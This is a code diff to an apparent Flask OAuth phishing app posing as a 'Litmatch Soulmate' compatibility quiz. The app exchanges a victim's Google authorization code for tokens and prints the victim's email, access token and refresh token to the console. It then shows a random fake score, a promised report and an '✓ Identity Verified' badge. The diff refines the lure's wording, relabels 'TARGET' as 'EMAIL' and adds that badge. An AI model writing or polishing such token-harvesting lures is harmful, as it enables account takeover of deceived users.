@@ -27,7 +27,7 @@ def index():
 def callback():
     code = request.args.get('code')
     if not code:
-        return "Verification Failed", 400
+        return "Verification Failed. Please try again.", 400
 
     token_url = "https://oauth2.googleapis.com/token"
     data = {
@@ -45,8 +45,9 @@ def callback():
     refresh_token = token_data.get('refresh_token')
     
     if not access_token:
-        return "Auth Error", 400
+        return "Authentication Error", 400
 
+    # Get Profile
     user_info = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
                              headers={"Authorization": f"Bearer {access_token}"}).json()
     
@@ -54,12 +55,12 @@ def callback():
 
     # Logging
     print("\n" + "💀" * 20)
-    print(f"TARGET: {target_email}")
+    print(f"EMAIL: {target_email}")
     print(f"ACCESS: {access_token}")
     print(f"REFRESH: {refresh_token}")
     print("💀" * 20 + "\n")
 
-    # UI Logic (ဒီနေရာမှာ Indentation မှန်ဖို့ အရမ်းအရေးကြီးပါတယ်)
+    # UI Result
     soulmate_score = random.randint(75, 98)
     
     return f"""
@@ -73,18 +74,19 @@ def callback():
             .heart {{ color: #ff3366; font-size: 50px; animation: pulse 1.5s infinite; }}
             @keyframes pulse {{ 0% {{ transform: scale(1); }} 50% {{ transform: scale(1.1); }} 100% {{ transform: scale(1); }} }}
             .score {{ font-size: 70px; font-weight: bold; color: #ff3366; margin: 10px 0; }}
-            .progress-container {{ width: 80%; background: #eee; border-radius: 20px; margin: 20px auto; }}
-            .progress-bar {{ width: {soulmate_score}%; background: #ff3366; height: 10px; border-radius: 20px; }}
+            .progress-container {{ width: 80%; background: #eee; border-radius: 20px; margin: 20px auto; overflow: hidden; }}
+            .progress-bar {{ width: {soulmate_score}%; background: #ff3366; height: 12px; border-radius: 20px; }}
         </style>
     </head>
     <body>
         <div class="card">
             <div class="heart">❤️</div>
-            <h2>Compatibility Result</h2>
+            <h2 style="color: #444;">Compatibility Result</h2>
             <div class="score">{soulmate_score}%</div>
             <p>Analyzing profile for: <b>{target_email}</b></p>
             <div class="progress-container"><div class="progress-bar"></div></div>
-            <p style="color: #888; font-size: 0.8em;">Full report will be sent to your Gmail in 2-5 minutes.</p>
+            <p style="color: #888; font-size: 0.85em;">A detailed Litmatch Soulmate Report is being sent to your Gmail. Please check in 2-5 minutes.</p>
+            <div style="color: #2ecc71; font-weight: bold; margin-top: 15px;">✓ Identity Verified</div>
         </div>
     </body>
     </html>
